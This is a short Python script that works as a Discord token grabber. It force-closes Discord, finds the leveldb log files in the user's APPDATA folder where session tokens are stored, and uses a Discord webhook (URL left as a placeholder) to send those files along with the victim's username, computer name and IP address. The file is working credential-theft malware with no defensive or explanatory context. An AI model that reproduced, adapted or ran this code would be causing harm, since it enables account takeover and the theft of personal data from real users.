from dhooks import Webhook, File
import os
import getpass
import socket

ip = socket.gethostbyname(socket.gethostname())
username = getpass.getuser()
pc_name = os.environ['COMPUTERNAME']

os.system("taskkill /IM discord.exe /f")


path = os.getenv('APPDATA')

discordloc = "\\discord\\Local Storage\\leveldb\\"

tokendir = str(path)+str(discordloc)
print (tokendir)

for root, dirs, files in os.walk(tokendir):
    for file in files:
        if file.endswith('.log'):
            logs = (file)
            print (file)

logsdir = str(path)+str(discordloc)+(logs)
print (logsdir)


hook = Webhook('WEBHOOK_URL_HERE')

file = File((logsdir))
   
hook.send((username))
hook.send((pc_name))
hook.send((ip))
hook.send('Token Grabbed:', file=file)
